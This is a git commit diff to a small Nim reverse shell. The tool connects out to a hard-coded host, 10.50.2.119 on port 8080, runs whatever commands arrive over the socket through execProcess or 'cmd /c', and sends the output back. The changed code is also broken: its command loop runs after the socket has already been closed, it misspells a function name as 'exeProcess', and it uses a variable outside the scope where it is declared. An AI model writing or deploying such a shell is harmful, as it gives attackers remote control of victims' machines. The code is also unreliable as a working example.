11d8796331d21db0b0a6ae4186542c2c9223608f
dmknght <dmknghtx2team@gmail.com>
2019-10-10 17:34:27 +0700

    Add exception for command fail

--- revshell.nim
+++ revshell.nim
@@ -1,19 +1,23 @@
 import net, osproc
 
 var
-    LHOST = "127.0.0.1" # edit here
+    LHOST = "10.50.2.119" # edit here
     LPORT = Port(8080) # Define port method as nim language requires
     sock = newSocket()
 
 try:
     sock.connect(LHOST, LPORT)
-    while true:
-        let cmd = sock.recvLine()
-        if cmd == "exit":
-            break
-        let result = execProcess(cmd)
-        sock.send(result)
 except:
     raise
 finally:
     sock.close
+
+while true:
+    let cmd = sock.recvLine()
+    if cmd == "exit":
+        break
+    try:
+        let result = execProcess(cmd)
+    except:
+        let result = exeProcess("cmd /c " & cmd)
+    sock.send(result)
